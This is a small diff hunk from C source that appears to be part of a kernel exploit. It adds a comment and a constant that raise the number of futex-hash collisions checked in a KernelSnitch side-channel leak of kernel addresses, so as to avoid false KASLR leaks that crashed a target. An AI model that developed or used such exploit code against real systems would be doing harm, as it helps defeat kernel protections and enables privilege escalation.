@@ -53,6 +53,14 @@
 #define SLIDE_KSNITCH_APPENDED_FUTEXES 2048
 #define SLIDE_KSNITCH_REPEAT_MEASUREMENT 64
 #define SLIDE_KSNITCH_AVERAGE 8
+/* Fix #27: KP#54 crashed on a bogus KernelSnitch leak (base ffffff8ba9bd0000,
+ * pgd=0 L1 translation fault).  The bruteforce accepts the FIRST mm candidate
+ * whose futex hash matches all collisions, so a coincidental hash-collision
+ * candidate can win the first-match race against the true mm.  With 4
+ * collisions the expected false-candidate count across the 64 GB identity
+ * range is ~1e-3; 6 collisions (5 pair tests, 4096 buckets) pushes it to
+ * ~1e-10, effectively eliminating false leaks. */
+#define KSNITCH_COLLISIONS 6
 #define SLIDE_BANK_SLOTS 4
 #define SLIDE_BANK_TASK_OFF 0x1000
 #define SLIDE_BANK_TASK_STRIDE 0x1c0
